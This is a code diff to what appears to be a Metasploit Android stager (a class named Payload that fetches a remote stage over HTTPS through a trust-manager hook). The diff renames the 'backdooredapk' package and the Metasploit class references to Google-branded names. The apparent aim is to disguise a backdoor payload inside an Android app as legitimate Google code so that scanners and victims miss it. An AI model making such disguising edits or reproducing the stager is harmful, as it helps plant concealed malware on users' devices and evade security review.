@@ -1,4 +1,4 @@
-package stage.metasploit.com.backdooredapk;
+package stage.google.com.test;
 
 
 import android.content.Context;
@@ -13,9 +13,8 @@ import java.io.OutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.io.IOException;
-import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
+
 import android.os.Build;
 import java.lang.reflect.Method;
 import java.net.MalformedURLException;
@@ -165,7 +164,7 @@ public class Payload {
         InputStream inStream;
         if (url.startsWith("https")) {
             URLConnection uc = new URL(url).openConnection();
-            Class.forName("com.metasploit.stage.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
+            Class.forName("com.google.stage.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
             inStream = uc.getInputStream();
         } else {
             inStream = new URL(url).openStream();
